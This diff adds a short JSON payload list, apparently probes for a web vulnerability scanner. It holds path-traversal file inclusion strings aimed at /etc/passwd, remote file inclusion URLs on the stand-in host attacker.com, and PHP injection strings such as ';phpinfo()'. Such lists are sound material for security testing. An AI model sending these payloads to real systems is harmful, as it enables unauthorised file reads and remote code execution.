@@ -1,0 +1,13 @@
+{
+	"LFI1": "../../../../../../../../../../../../../../etc/passwd",
+	"LFI2": "../../../../../../../../../../../../../../lfi.php",
+    "LFI3": "../../../../../../../../../../../../../lfi.php",
+  	"LFI4": "../../../../../../../../../../../../../../lfi",
+	"RFI1": "https://attacker.com/a.php",
+    "RFI2": "https://attacker.com/a.js",
+    "RFI3": "https://attacker.com/a",
+	"PHP1": ";phpinfo()",
+    "PHP2": "phpinfo()",
+    "PHP3": ";echo \"pawned\"",
+    "PHP4": "echo \"pawned\""
+}
